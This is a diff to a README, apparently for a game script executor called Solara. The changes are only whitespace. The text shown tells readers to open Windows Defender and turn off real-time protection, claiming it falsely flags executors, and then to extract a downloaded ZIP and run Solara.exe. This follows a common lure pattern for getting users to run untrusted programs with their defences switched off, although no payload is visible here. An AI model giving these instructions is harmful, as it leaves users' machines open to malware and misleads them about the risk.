@@ -8,12 +8,16 @@
 Windows Defender may falsely flag executors. To ensure a smooth installation, disable it temporarily:
 
 Press Win + R, type windowsdefender://threat/, and hit Enter.
+
 Turn off Real-time protection.
+
 Now you're ready to install! 🚀
 
 **📥 Download & Setup**
-✅ 1. Download the ZIP file 
+✅ 1. Download the ZIP file
+
 ✅ 2. Extract the ZIP File - Right-click the .zip file and select "Extract All".
+
 ✅ 3. Open Solara.exe - Double-click Solara.exe and enjoy!
 
 **If you followed all the steps correctly, Solara will work perfectly! 🎉**
